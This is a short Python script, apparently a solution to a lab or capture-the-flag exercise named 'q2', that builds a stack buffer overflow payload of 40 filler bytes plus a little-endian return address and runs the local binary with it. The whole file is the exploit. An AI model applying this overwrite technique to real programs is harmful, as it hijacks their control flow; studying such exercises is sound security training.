#!/usr/bin/python3
# wrapper
import os
buff=40*(b'x')
addr=bytearray.fromhex("0000000100000460")
addr.reverse()
buff+=addr
print("exec ./q2 with buff",buff)
os.execv('./q2',['./q2',buff]);